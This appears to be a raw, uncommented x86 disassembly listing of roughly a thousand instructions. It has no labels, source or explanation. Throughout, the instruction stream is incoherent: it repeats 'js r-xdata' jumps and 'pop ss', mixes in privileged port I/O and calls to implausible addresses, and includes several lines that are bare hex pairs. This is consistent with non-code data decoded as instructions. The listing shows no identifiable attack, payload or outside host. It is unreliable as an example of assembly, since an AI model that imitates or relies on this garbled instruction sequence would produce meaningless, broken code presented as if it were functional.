jo r-xdata
js r-xdata
sbb [ esi + ecx * 4 - 0x24c1529f ] 0x28
js r-xdata
lodsd [ esi ]
js r-xdata
js r-xdata
js r-xdata
or ebx [ ebx ]
js r-xdata
jg r-xdata
js r-xdata
pop ss
js r-xdata
lodsd [ gs : esi ]
dec eax
mov eax 0x64002e63
adc [ edi ] dl
pop ss
add al 0xe4
add [ eax + ebx + 0x17 ] ebp
pop ss
js r-xdata
js r-xdata
add [ 0x7817173a ] edi
popfd
pop ss
pop ss
stosd [ edi ]
imul ebp [ edi ] 0xe8e8e86c
add [ esi ] ebx
or [ edi ] edx
pop ss
js r-xdata
mov edx 0x117171b
in al dx
out 0x6c eax
mov dh 0x1b
pop ss
pop ss
imul edx eax 0xe8e8adb8
out 0x6d eax
sub [ esi + 0x171bf701 ] dh
pop ss
pop ss
fistp [ esi ]
shr [ ebx ] cl
out 0x6e eax
and eax 0x1171711
cmp eax 0x7817173a
call 0x14880f12
js r-xdata
mov fs [ ecx - 0x53 ]
js r-xdata
jmp 0x4a9f178
add [ edx - 0x2 ] edi
jno r-xdata
sub bh ah
insb
retn 0x171e
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x7871f7d8
js r-xdata
js r-xdata
popad
mov ch 0x14
add [ edi ] edx
pop ss
js r-xdata
insb
in al dx
call 0x17fef7b5
mov esi 0x3f0f01e0
pop ss
pop ss
js r-xdata
stosd [ edi ]
clc
insd
sub bh ah
insd
js r-xdata
js r-xdata
pop ss
add [ edx + 0x14 ] eax
js r-xdata
pop ss
js r-xdata
sbb edx [ edi ]
sbb edx [ bx ]
sub al 0x68
call 0x2c5111a5
pop ss
arpl [ ecx ] bp
and [ ebx ] ebp
js r-xdata
arpl [ eax ] sp
add dh 0x1
test [ edi ] esp
insb
int3
0x117170b 0x273f
pop ss
pop ss
js r-xdata
and [ edx + 0x278501c6 ] al
js r-xdata
js r-xdata
call 0x78be871d
js r-xdata
js r-xdata
js r-xdata
pop ss
adc al 0x1
js r-xdata
add [ ecx + edi * 8 ] esp
js r-xdata
call 0x175a4f2c
js r-xdata
pop ss
insb
js r-xdata
in al dx
fild [ eax + 0x6314b563 ]
jmp r-xdata
adc eax 0x618e1717
js r-xdata
sub edi [ eax + 0x78 ]
pop ss
mov edi 0x1b0b01bf
pop ss
js r-xdata
call 0xffffffffe8c6f867
jmp 0xffffffffcc47f86c
popad
js r-xdata
js r-xdata
jle r-xdata
mov eax 0x170c9d17
mov edi 0xe06601f4
call 0xffffffffe0e373eb
mov eax 0x40a5618e
jg r-xdata
js r-xdata
push edi
add [ edi ] dl
js r-xdata
js r-xdata
pop ss
pop ss
call 0x1ee9181
jl r-xdata
stc
mov fs [ ecx - 0x5b ]
sbb [ eax ] al
dec ebx
out dx al
call 0x65f2910f
insd
mov [ edi ] ss
pop ss
pop ss
mov esi 0xfe7501b8
call 0x78be871e
js r-xdata
adc al 0x17
inc edx
ror [ esi ] 0x1
pop ss
out 0x6c eax
pop ss
lodsd [ esi ]
adc al 0xb9
mov esi 0x15646565
pop ss
mov fs [ ecx - 0x5b ]
inc eax
fadd [ edi ]
popad
mov ch 0x48
mov fs [ ecx - 0x43 ]
dec esp
add [ eax ] dh
push edi
pop ss
pop ss
xchg ebp eax
adc eax 0x618e1717
js r-xdata
pop ss
pop ss
sub al 0x17
jle r-xdata
add [ edx + 0x117170b ] bl
aas
daa
js r-xdata
js r-xdata
js r-xdata
call 0x6e2d88c4
call 0x1fef8cc
and edi [ eax ]
js r-xdata
sub al 0x2f
lodsd [ esi ]
sbb eax 0xe882e882
mov gs [ edi ]
lodsd [ esi ]
adc [ edi ] edx
cmp [ ecx - 0x4b ] ah
test al 0xe0
popad
lodsd [ esi ]
adc al 0x1
cld
pop ss
js r-xdata
mov cl 0x1
mov bh 0x38
pop ss
pop ss
js r-xdata
js r-xdata
fidiv [ eax ]
js r-xdata
pop ss
mov fs [ ecx - 0x6b ]
js r-xdata
insd
pop esp
adc [ edi ] dl
pop ss
add eax edi
xor al 0x17
pop ss
js r-xdata
mov ch 0x1c
mov edi 0x17386600
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sub [ ecx ] al
pop ss
js r-xdata
add [ ebx ] esp
pop ss
pop ss
js r-xdata
js r-xdata
popad
mov ch 0xa6
js r-xdata
pop ss
call 0x3869119e
imul ebp [ eax + edi * 8 ] 0x6b
xchg esp eax
int3
js r-xdata
js r-xdata
mov fs [ ecx - 0x54 ]
int3
xor al 0xe8
call 0x204cd0d
sbb [ eax ] cl
test al 0x1
mov ecx 0x78e8e8e6
js r-xdata
pop ss
js r-xdata
popad
js r-xdata
pop ss
mov ebx 0xb804ad65
add [ ebx + 0x16 ] esi
pop ss
pop ss
pushfd
int3
jle r-xdata
mov fs [ ecx - 0x4b ]
mov eax 0x36639a82
add [ ecx + 0xf ] edi
xor [ esi + 0x63a4b561 ] cl
xor [ esi + 0x63a6b561 ] ecx
sub bh ah
js r-xdata
arpl [ edi ] si
cmpsb [ esi ] [ edi ]
js r-xdata
clc
imul edx [ esp + ecx * 8 + 0x6de7e9fc ] 0x5c
add edx [ edi ]
arpl [ ebp + 0x30710114 ] bp
pop ss
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
sub [ edi ] dl
pop ss
js r-xdata
popad
lodsd [ esi ]
or [ ecx ] al
or dl [ edi ]
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x177cdb87
pop ss
insd
sub bh ah
pop ss
pop ss
js r-xdata
insd
fadd [ edi ]
pop ss
pop ss
pop ss
pop ss
js r-xdata
call 0x1e47f9ac
push edi
pop ss
pop ss
js r-xdata
insb
js r-xdata
aaa
js r-xdata
pop ss
js r-xdata
push 0xb8e8e8e8
js r-xdata
cwde
add ebp ebp
or dl [ edi ]
pop ss
mov eax [ 0x1ca5eb10 ]
add [ edi + 0x1717173f ] ecx
jle r-xdata
add [ ecx + 0xc ] al
pop ss
js r-xdata
js r-xdata
out 0x34 eax
pop ss
pop ss
arpl [ ebp + 0x782bb5e0 ] bp
js r-xdata
mov dl 0x1
sbb esp esi
call 0xffffffffe7be8933
mov fs [ ecx - 0x43 ]
js r-xdata
out 0xe8 al
popfd
in al 0x63
lodsd [ esi ]
loopne r-xdata
out 0x6d eax
cwde
adc al 0x63
loopne r-xdata
call 0x1801f9df
jle r-xdata
add [ edi + 0x78171715 ] ecx
js r-xdata
pop ss
pop ss
js r-xdata
popad
mov ch 0xb8
sbb [ edx + 0x79013663 ] 0xf
jmp r-xdata
arpl [ ebx - 0x18d79208 ] bp
js r-xdata
cmp [ edi ] dl
call 0x2347c8cd
js r-xdata
mov eax 0x17bc9e17
js r-xdata
inc esp
call 0xffffffff9617fae8
adc al 0x1
add dl [ edi ]
pop ss
mov esi 0x17250b00
pop ss
mov cl 0x6d
insd
sub [ edi + 0x72bd618e ] 0xb2
jb r-xdata
pop ss
or esp [ 0x6db11717 ]
sbb [ ebp + 0x74bd618e ] 0xb2
mov ebp 0x9d82b272
mov fs [ ecx - 0x43 ]
je r-xdata
js r-xdata
insd
mov eax 0x6b21db8c
adc [ edi ] dl
add esi ebp
pop es
push edi
mov fs [ ecx - 0x43 ]
jbe r-xdata
call 0x17c6f9e6
call 0xffffffffbf01f9eb
add [ edi - 0x15 ] dl
call 0xffffffffe4727cf3
add [ ebx ] edi
sub dl [ edi ]
pop ss
js r-xdata
call 0xffffffffe85d91e7
js r-xdata
fld [ eax ]
add eax ebx
pop es
pop ss
or al 0x17
insb
adc edx [ edi ]
pop ss
mov eax 0x17e0ad63
insd
mov eax 0x17382301
mov fs [ ecx - 0x43 ]
mov ah 0x82
xor [ edx + 0x618e8682 ] 0x82b2b6bd
mov [ esi + 0x188bd61 ] cs
popfd
adc al 0x17
popfd
or al 0x17
mov edi 0xf3601f4
pop ss
pop ss
js r-xdata
sahf
mov esp 0x17e09d17
sub al 0x17
jle r-xdata
mov ebp 0x17267601
js r-xdata
pop ss
pop ss
add [ esi + 0x28 ] ecx
pop ss
pop ss
js r-xdata
sub [ esi + 0x782b21b3 ] dh
js r-xdata
popad
lodsd [ esi ]
inc edx
arpl [ esi ] di
out 0x6c eax
js r-xdata
js r-xdata
call 0x104ccec
push edi
jmp r-xdata
adc [ edi ] 0xe8
pop ss
insd
and [ 0xffffffffde011717 ] dl
xor [ edi ] dl
mov edi 0xdb05ad61
xor esp [ ebp - 0x53 ]
adc al 0xb8
mov ebx 0x4ad65bb
mov eax 0x17167301
pop ss
mov esi 0xe7286da4
js r-xdata
js r-xdata
call 0x2bc6fb4d
call 0xffffffffe8c8fb52
mov esi 0xe8eabf00
call 0xffffffffd22a3edf
xchg ebx eax
aam 0xe7
call 0x17609fa9
js r-xdata
sbb al 0x38
pop ss
pop ss
js r-xdata
popad
mov ebp 0x8c82b2b6
mov fs [ ecx - 0x43 ]
mov [ ecx ] al
adc [ gs : 0x1a011717 ] dl
pop ss
add [ 0x78171714 ] ecx
js r-xdata
pop ss
test al 0x6c
out dx eax
call 0xffffffffe7be8aca
insb
pop esp
js r-xdata
fld [ eax ]
add [ edi + 0x6317170c ] eax
xor [ edx - 0x4a9e7175 ] eax
inc esp
mov bl 0x8e
popad
mov ch 0x46
mov edi 0x170d0901
pop ss
js r-xdata
rcr [ ebx ] cl
out 0x6c eax
mov cl 0x3e
pop ss
pop ss
pop ss
pop edi
popfd
or al 0x17
mov edi 0x68e880f4
call 0x167215dd
pop ss
pushad
pop eax
call 0x4047fc76
out dx al
call 0xffffffffb1be8c7c
insd
sub bh ah
insb
in al dx
call 0x17fefc86
mov esi 0xa8936be0
insb
insd
sub bh ah
js r-xdata
adc al 0x17
pop ss
insd
adc al 0x1
js r-xdata
pop ss
mov [ edx ] ds
js r-xdata
pop ss
js r-xdata
call 0x14fb7506
js r-xdata
js r-xdata
js r-xdata
inc esp
push ds
pop ss
pop ss
add [ eax + 0x20 ] dl
pop ss
pop ss
arpl [ eax ] sp
add esp esi
xor [ edi ] edx
pop ss
sub dl 0x1
std
insd
mov ah 0xfd
dec edi
imul edx [ esi ] 0xffffffc8
out 0x6a eax
add eax 0x1171727
cdq
sti
call 0x12b5f962
sbb [ edi ] dl
pop ss
add [ ebx + 0x2f ] ebp
pop ss
pop ss
mov fs [ ecx - 0x20 ]
sub edi [ eax + 0x78 ]
js r-xdata
and [ ebx ] ebp
js r-xdata
js r-xdata
call 0x2bfdfd5e
js r-xdata
js r-xdata
mov [ 0x65171713 ] eax
scasd [ edi ]
out 0x6c eax
js r-xdata
js r-xdata
js r-xdata
js r-xdata
call 0x25b1496
pop ss
js r-xdata
js r-xdata
mov [ edi + edx ] esi
js r-xdata
pop ss
js r-xdata
arpl [ ebp - 0x23512ccc ] bp
add [ ecx + 0x1c ] eax
pop ss
popad
mov ch 0x14
js r-xdata
js r-xdata
and eax 0x78171733
js r-xdata
push edi
js r-xdata
sbb [ ebx - 0x17137bff ] 0xe8
js r-xdata
mov ecx [ esi - 0x4cbb4a9f ]
mov fs [ ecx - 0x4b ]
inc esi
pop ss
jle r-xdata
or al 0x17
js r-xdata
call 0x78be402f
js r-xdata
js r-xdata
js r-xdata
pop ss
sar [ eax - 0x14911848 ] cl
call 0xffffffffb5a7fc05
add [ esi + 0x26 ] esi
pop ss
sub dl [ edi ]
pop ss
adc [ gs : 0x1a011717 ] dl
sub bh ah
js r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
insd
adc al 0x63
js r-xdata
out 0x6d eax
lodsd [ esi ]
cmp [ esi - 0x37afe48 ] bh
call 0x78be8b1f
out 0x6c eax
push cs
sub al 0x17
pop ss
and [ gs : 0x6d651717 ] dl
and [ ecx ] eax
cmp ah ch
call 0x63be8b04
cwde
aam 0xeb
sbb [ ecx ] al
xchg ebp eax
or edx [ edi ]
pop ss
js r-xdata
insb
pop ss
mov eax 0x105c6565
pop ss
pop ss
add [ ecx + 0x39 ] al
pop ss
pop ss
mov cl 0x6b
adc cl ch
and [ 0x41001717 ] dl
or al 0x17
call 0xffffffffbda9fa86
loopne r-xdata
mov edx 0x78e8e8eb
js r-xdata
js r-xdata
add edx [ edi ]
pop ss
js r-xdata
in eax dx
sub edi [ eax + 0x78 ]
js r-xdata
jmp 0xffffffffe932da72
pop ss
pop ss
scasd [ edi ]
add [ 0x78e8e8ea ] ebx
js r-xdata
lodsd [ esi ]
xor al 0xd3
scasb [ edi ]
fadd [ ecx ]
inc ecx
sbb al 0x17
call 0xffffffffbb5def24
scasd [ edi ]
pop ss
jle r-xdata
insd
xor [ edi + 0x17 ] edx
pop ss
mov esi 0x170c5000
pop ss
popfd
sbb al 0x17
mov edi 0x321019c
pop ss
pushfd
mov fs [ ecx - 0x6b ]
js r-xdata
js r-xdata
js r-xdata
add [ ebp + 0x78e8e8fc ] eax
js r-xdata
call 0x78be8ac4
js r-xdata
pop ss
js r-xdata
insd
adc al ch
js r-xdata
call 0x78be8e5c
js r-xdata
pop ss
js r-xdata
js r-xdata
shr [ ebx ] cl
out 0x6c eax
and al 0xe0
call 0x120e15f2
pop ss
pop ss
mov dl 0x1
cmpsd [ esi ] [ edi ]
pop ss
pop ss
js r-xdata
pop ss
fld [ eax ]
js r-xdata
0x7878e8e8 0x7878
js r-xdata
pop ss
js r-xdata
call 0x1d47fc2d
call 0xffffffffea63152e
out 0x6a eax
xor dl [ edi ]
pop ss
fld [ eax ]
popad
lodsb [ esi ]
int3
js r-xdata
pop eax
xchg ebp eax
js r-xdata
js r-xdata
pop ss
arpl [ ebp + 0x19610138 ] bp
pop ss
pop ss
js r-xdata
or [ ecx - 0x71617d50 ] 0x61
lodsd [ esi ]
sbb [ eax + 0x5019882 ] dh
loopne r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
mov cl 0x6d
sub bh ah
insb
and dl [ edi + 0x17 ]
pop ss
fld [ eax ]
mov dh 0xb3
adc eax 0xbbb81717
js r-xdata
call 0x357116db
js r-xdata
js r-xdata
mov edi 0x79501e0
js r-xdata
js r-xdata
loopne r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
add ebp ebp
add [ ebp + 0x10 ] esp
pop ss
mov fs [ ecx - 0x4b ]
adc [ ebx + 0x36 ] ah
mov fs [ ecx - 0x4b ]
adc ah [ ebx + 0x30 ]
mov fs [ ecx - 0x4b ]
call 0x16c4156b
add [ ebp + 0x17555a01 ] 0x17
pop ss
js r-xdata
sub [ eax + 0x17020701 ] ch
js r-xdata
insb
loop r-xdata
popfd
loopne r-xdata
lodsd [ esi ]
xchg ebp eax
mov bh 0x1
add [ edx ] ebx
pop ss
pop ss
js r-xdata
cmp al 0x1
push ss
push esi
pop ss
pop ss
imul ebp [ esp ] 0x6d
sub bh ah
insb
push ebp
pop ss
js r-xdata
js r-xdata
sbb [ eax + 0x170aed01 ] 0x17
mov esi 0xe7286da4
insb
add al 0x68
add [ ebx ] ch
js r-xdata
cld
insd
sub al 0x68
call 0x182e9802
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
pop es
xchg ebp eax
js r-xdata
add [ edi + 0x78171755 ] eax
js r-xdata
js r-xdata
pop ss
js r-xdata
add dl [ edi ]
add [ edi ] eax
arpl [ edx ] bp
mov fs [ ecx - 0x53 ]
[ edi + 0x1d ] ebp
pop ss
pop ss
js r-xdata
push 0xe7eaf895
insd
add [ ecx ] ch
pop ss
pop ss
js r-xdata
call 0xffffffffe9303048
call 0x78be8bc4
js r-xdata
js r-xdata
xor eax 0x2c6b1717
and [ ebx ] ebp
js r-xdata
outsb
sub al 0xf0
js r-xdata
js r-xdata
or [ edi ] edx
jg r-xdata
call 0xffffffff832efd80
call 0xffffffffc912b134
push ebp
pop ss
pop ss
js r-xdata
movsd [ edi ] gs : [ esi ]
sub al 0x65
lodsd [ esi ]
dec esp
add [ ecx + ecx + 0x17 ] esi
add [ edi + 0x53d101b0 ] 0x17
pop ss
js r-xdata
sub al 0xe4
add [ edi ] edx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
arpl [ ecx + edi * 4 ] ax
mov ecx 0xe8ef1d01
call 0x3bf6164d
pop ss
clc
0x29006de7 0x1717
mov ebx 0x17349d17
test al 0x1
pop es
js r-xdata
js r-xdata
sbb eax 0x78e8e8ea
js r-xdata
add [ ebp - 0x18 ] edi
call 0xfffffffff8981719
call 0x595188e
pop ss
insd
and [ 0xffffffffbbb81717 ] dl
js r-xdata
js r-xdata
js r-xdata
popad
js r-xdata
js r-xdata
pushfd
int3
js r-xdata
js r-xdata
pop ss
call 0x201fd75
adc [ gs : edi ] dl
pop ss
js r-xdata
cmp edx [ edi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ edi + 0x3a ] eax
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x2921fd32
mov dh 0xb3
add [ edx + 0x36 ] esi
sub cl [ esi + 0x1f0ad61 ]
outsd
sbb eax 0x78781717
call 0x78be8c33
or [ eax + 0x17bc9e17 ] bh
lodsd [ gs : esi ]
js r-xdata
sbb al 0xe8
call 0x519396e9
js r-xdata
pop ss
mov ebx 0x17558701
pop ss
lodsb [ esi ]
int3
enter 0xbe17 0x9c
js r-xdata
jmp r-xdata
js r-xdata
add [ esi ] ecx
sbb al 0xe9
call 0xffffffffe1052c4d
pop ss
jg r-xdata
popfd
xor al 0x17
add [ edi ] dl
pop ss
js r-xdata
sbb [ ecx ] al
push cs
pop ss
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
push esi
js r-xdata
push es
pop ss
pop ss
js r-xdata
or al 0x6
js r-xdata
jmp r-xdata
mov esi 0xccac179c
cld
arpl [ esp + ecx * 8 - 0x13502c04 ] bp
js r-xdata
call 0x78be8ded
js r-xdata
pushfd
int3
sbb [ ecx + ebp * 8 ] 0xe8
call 0x1826d37d
js r-xdata
xor [ edi ] edx
pop ss
js r-xdata
imul ebp [ esp ] 0x1
js r-xdata
pop ss
js r-xdata
call 0x175c3ff7
js r-xdata
rol [ eax - 0x17172718 ] 0x1
push eax
movhps [ edi ] xmm2
js r-xdata
js r-xdata
mov cl 0x82
js r-xdata
js r-xdata
js r-xdata
js r-xdata
popfd
clc
pop ss
popfd
in al 0x17
js r-xdata
add [ edi ] edx
pop ss
js r-xdata
popad
call 0x177b40f4
js r-xdata
jmp 0xffffffffbf5dfd4c
pop ss
pop ss
in al 0x1
arpl [ eax ] bx
insd
and al ch
popad
outsb
js r-xdata
js r-xdata
outsb
pushfd
js r-xdata
sub al 0x63
sbb [ esi + ecx * 4 - 0x4ed55a9f ] 0x82
js r-xdata
cmp al 0x65
lodsd [ esi ]
or al 0x1
pop ss
pop ss
pop ss
js r-xdata
0xbebbe8e8 0xac82
pop ss
sub [ ebx + ebx * 8 + 0x60ad6533 ] 0xbb
mov eax 0x17044301
pop ss
js r-xdata
call 0x2221fe9d
add [ 0x1f171711 ] esp
sub esi [ 0x2c6b1717 ]
js r-xdata
push eax
call 0x2f46ffd6
xor al 0x17
js r-xdata
add dl [ eax + 0x17 ]
out 0x6c eax
push ss
sbb [ edi ] dl
pop ss
add [ ebp + 0x3e ] esp
pop ss
pop ss
arpl [ ebx + 0x61ec82fc ] bp
lodsb [ esi ]
int3
sub dh [ ecx + 0x618e9d82 ]
movsd [ edi ] [ esi ]
popad
js r-xdata
mov fs [ ecx - 0x5b ]
js r-xdata
push edx
popfd
clc
scasb [ edi ]
add [ edi ] esp
aaa
pop ss
pop ss
js r-xdata
and eax 0x1f171711
mov al [ ecx ]
fucom st0
call 0x78be8f25
lodsd [ gs : esi ]
js r-xdata
pop ss
js r-xdata
pop ss
or [ ebx - 0x3b ] 0xb
idiv [ edi + 0xc0ae61 ]
push ecx
xor al 0x17
pop ss
cmp [ ebx - 0x40e51e8a ] 0x61
scasb [ edi ]
int3
call 0x347517d7
pop ss
mov edi 0xec571863
jmp 0x6605ff64
js r-xdata
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
js r-xdata
pop ss
js r-xdata
pop ss
rcl [ esp + ecx * 8 + 0x500201dc ] 0x1
pop ss
js r-xdata
lodsb [ esi ]
mov eax 0x1725d501
js r-xdata
imul ebp [ eax + esi * 8 ] 0x61
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
js r-xdata
aaa
add ebp eax
and edx [ edi ]
sbb [ ebp + 0x2ca5618e ] 0x63
add ecx ecx
popfd
mov fs [ ecx - 0x5b ]
mov cl 0x82
js r-xdata
xchg esp eax
int3
js r-xdata
add ebp edx
js r-xdata
js r-xdata
mov ebp 0x36f900e4
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
push edi
pop ss
pop ss
js r-xdata
leave
fadd [ ecx ]
and eax 0x78781717
js r-xdata
js r-xdata
add [ ecx - 0x1a ] ebp
call 0x78be91ba
js r-xdata
js r-xdata
pop ss
mov eax 0xe09d17
add cl bh
add [ esi - 0x4ee8e8f9 ] ch
and [ ebx ] ebp
js r-xdata
pop ss
arpl [ ebp + 0x36f900e4 ] di
js r-xdata
pop ss
pop ss
js r-xdata
and [ ecx ] eax
add [ eax ] eax
pop ss
pop ss
mov eax 0x17238701
pop ss
js r-xdata
pop ss
out 0x6c eax
test eax 0x63171734
cmpsb [ esi ] [ edi ]
rol [ ecx ] 0xc8
pop ss
pop ss
imul edx [ eax ] 0xffffffe9
out 0x6c eax
xor edi ebp
call 0xffffffffd15df2aa
call 0x174b65a8
mov ch 0xf8
out 0x6d eax
jne r-xdata
pop ss
js r-xdata
lds esp [ ebx ]
pop ss
mov edi 0xe8ebba01
pop ss
js r-xdata
js r-xdata
insb
std
mov edi 0x17354700
pop ss
mov cl 0xb1
insd
sub [ ecx ] al
mov eax 0xdb17171a
sub [ eax + 0x78782b21 ] ch
call 0x4dc6fee8
push ecx
sub bh ah
insb
mov ah 0x35
pop ss
pop ss
pop ss
sahf
mov esp 0x1732a101
pop ss
js r-xdata
add bl ch
and dl [ edi ]
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sbb al 0x17
js r-xdata
out 0xe8 al
call 0x78be914b
js r-xdata
fsub [ eax ]
js r-xdata
pop ss
in al 0x0
stc
js r-xdata
pop ss
pop ss
add [ edi + 0x6317172a ] ah
arpl [ ecx ] bp
and [ ebx ] ebp
js r-xdata
js r-xdata
js r-xdata
imul esp [ edi + edx ] 0x17
pop ss
pop ss
insd
and [ 0x1b81717 ] dl
popad
xor esp edi
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
add eax 0x78781717
js r-xdata
rol [ 0x78781717 ] 0x1
pop ss
js r-xdata
scasb [ edi ]
pop ss
js r-xdata
pop ss
add [ ecx + 0xd ] ecx
pop ss
pop ss
js r-xdata
mov ebx 0x65bbbbbb
insd
js r-xdata
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
insd
cmp al 0x15
pop ss
pop ss
mov eax 0x3c5561bb
adc eax 0x89011717
push edi
pop ss
pop ss
mov eax 0xb8ef5ee7
add [ eax + 0xc ] edi
pop ss
pop ss
js r-xdata
dec eax
mov ebx 0x6d65bbbb
adc eax 0x17b81717
mov edi 0x7f17bbb8
inc esp
mov ebx 0x486d65bb
js r-xdata
call 0xffffffffe8c903f5
pop ss
jle r-xdata
das
lodsd [ esi ]
pop esp
mov al 0x8d
xchg [ esi - 0x5aaf52d1 ] bh
movsd [ edi ] [ esi ]
mov al 0x8d
das
lodsd [ esi ]
push esp
xchg [ esi - 0x2cff5a5b ] bh
xor [ edi ] edx
pop ss
mov bh 0xb6
mov bl 0x6d
add [ esi + ecx ] esp
js r-xdata
call 0xffffffffccea7dbb
clc
in al dx
add ebx edx
sub ah ch
out 0x6c eax
js r-xdata
js r-xdata
js r-xdata
xor [ edi ] edx
pop ss
js r-xdata
shl [ ecx ] 0x1
pop ss
pop ss
arpl [ ecx + ebp * 2 ] ax
pop ss
js r-xdata
insd
js r-xdata
lea esi [ eax + 0x14ad618e ]
call 0x124803fd
adc [ edi ] edx
pop ss
js r-xdata
fld [ eax ]
mov fs [ ecx - 0x53 ]
push ss
lodsd [ gs : esi ]
sbb [ ecx ] al
push esp
and al 0x17
pop ss
mov fs [ ecx - 0x6b ]
arpl [ cs : esi ] dx
mov fs [ ecx - 0x6b ]
and [ ecx ] al
sbb eax 0x7817172e
mov fs [ ecx - 0x4b ]
clc
popad
lodsd [ esi ]
js r-xdata
pop ss
pop ss
fld [ eax ]
mov cl 0xb1
popad
push cs
js r-xdata
insd
and edi esp
insb
js r-xdata
js r-xdata
add dl al
cmp edx [ edi ]
pop ss
insd
sub [ ecx ] al
imul esp esi 0x7878e8e8
js r-xdata
insb
out 0x32 al
pop ss
out 0x6c eax
pop ss
add [ edi ] ebp
xor dl [ edi ]
js r-xdata
call 0xbce8504
pop ss
pop ss
imul ebp [ eax ] 0xffffffea
add [ edi ] esi
or dl [ edi ]
add al 0xf8
in al dx
call 0x24ec199f
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
pop ss
mov eax 0x1782f682
and [ gs : 0x57001717 ] dl
push edi
pop ss
pop ss
add [ eax ] ebx
or eax 0x6ce71717
out dx eax
call 0x20aa03bf
add [ ecx ] dl
and edx [ edi ]
pop ss
pop ss
pushfd
int3
add al 0x17
pop esp
in al dx
out 0x6c eax
js r-xdata
push edi
pop ss
pop ss
js r-xdata
rcl [ edi + 0x17 ] cl
inc eax
js r-xdata
add [ edi ] ecx
push edx
pop ss
pop ss
js r-xdata
movsd [ edi ] gs : [ esi ]
adc al 0xb9
mov eax 0x17537201
pop ss
lodsd [ gs : esi ]
xor al 0xb8
lodsd [ gs : esi ]
push 0x1707e701
js r-xdata
pop ss
pop ss
js r-xdata
add al 0x15
js r-xdata
cli
arpl [ edi ] si
mov fs [ ecx - 0x4b ]
lodsb [ esi ]
sbb [ edx - 0x4a9e714d ] 0xae
add [ edx + 0x78171703 ] ebp
js r-xdata
popad
xchg ebp eax
adc [ ecx ] al
xor [ edi ] dl
pop ss
js r-xdata
lodsd [ esi ]
adc al 0xb8
pop ss
aas
add [ eax - 0x47e8e8de ] edi
xor dh 0x82
pop ss
pop ss
js r-xdata
sbb dh [ eax + 0x618ec682 ]
lodsd [ esi ]
sbb al 0xb0
mov fs [ ecx - 0x53 ]
push ds
or [ ebp - 0x529e7150 ] 0x10
adc [ eax - 0x529e7150 ] 0x12
or [ ebp - 0x529e7150 ] 0x14
mov fs [ ecx - 0x53 ]
mov ch 0x10
js r-xdata
js r-xdata
pop ss
pushfd
int3
call 0xfffffffff8f17fd8
mov ebx 0x1739e001
pop ss
js r-xdata
js r-xdata
mov cl 0x1
js r-xdata
or eax 0x65781717
insd
dec eax
adc eax 0x30011717
das
sub al 0x1
pop ebp
call 0x78bf015b
js r-xdata
add al 0xe0
0x6d65e8e8 0x1510
add al 0x69
call 0xffffffff8cc900d1
add edx esp
adc eax 0x78781717
add [ esi + 0x618e2063 ] 0xa5
sbb [ ecx ] al
cld
out dx al
call 0xffffffffdd17a6e8
stc
out 0x6d eax
out 0xe8 al
call 0xffffffffea7083f2
mov gs [ ebx - 0x2c ]
stc
mov eax 0xbbb8bf17
pop ss
jg r-xdata
js r-xdata
popad
lodsd [ esi ]
insd
pop ss
js r-xdata
xor dl [ edi ]
pop ss
arpl [ ebp + 0x32dc00e4 ] di
pop ss
pop ss
mov ebp 0x32c4001c
pop ss
pop ss
pop ss
adc eax 0xd4001717
js r-xdata
popfd
loopne r-xdata
js r-xdata
add edx ecx
push ss
pop ss
pop ss
mov fs [ ecx - 0x53 ]
xor [ ebx + 0x29 ] ah
add [ eax + ebx + 0x17 ] ebp
pop ss
js r-xdata
js r-xdata
das
js r-xdata
call 0xffffffff805785c7
out 0x6a eax
inc ebx
in al dx
call 0xffffffffe75d87d0
insd
dec ebx
in al dx
lodsd [ esi ]
cmp al 0xb8
add ecx esi
aas
pop ss
pop ss
js r-xdata
push ebx
js r-xdata
salc
js r-xdata
and [ edi ] dl
add [ eax ] esi
js r-xdata
pop es
pop ss
pop ss
mov cl 0x21
sub edi [ eax + 0x78 ]
mov ch 0x14
popad
movsd [ edi ] [ esi ]
sbb al 0x61
mov ebp 0x14ad6310
popad
lodsd [ esi ]
or al 0x63
lodsd [ esi ]
adc [ ecx - 0x53 ] ah
add [ ebx - 0x53 ] ah
sbb al 0x61
lodsd [ esi ]
add al 0xdb
sub bl bl
cmp al [ ecx ]
imul esp [ 0x78781717 ] 0x78
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add ah dl
insd
pop ss
js r-xdata
add [ edi + edx ] dl
pop ss
add esi edx
xor [ edi ] dl
pop ss
imul edx [ ebp - 0x1fe171c ] 0x38
pop ss
pop ss
js r-xdata
insd
js r-xdata
sub bh ah
insb
pop ss
js r-xdata
js r-xdata
js r-xdata
sub bh ah
insb
sbb al 0x4
pop ss
pop ss
add [ ebx + 0x78781717 ] edx
js r-xdata
mov dh 0xb3
insd
call 0x2922032c
popad
mov ch 0x8
popad
mov ch 0x1c
mov ss bx
scasb [ edi ]
out dx al
out 0x6b eax
aaa
xor al 0x17
pop ss
add [ edi - 0x47e8e8f0 ] edi
sub dl 0x80
test [ ss : edi ] edi
dec ebx
pop ss
pop edi
and al 0xe8
call 0x4a11c52
pop ss
pop ss
out 0x6c eax
push cs
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
call 0x1c1285fa
pop ss
pop ss
mov gs [ ebx - 0x2e ]
call 0xffffffff8f304276
imul edx esp 0xfffffff9
xchg edi eax
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
add [ ebp - 0x53 ] ah
js r-xdata
mov fs [ ecx - 0x53 ]
adc bl bl
sub [ esi + 0x6514ad61 ] cl
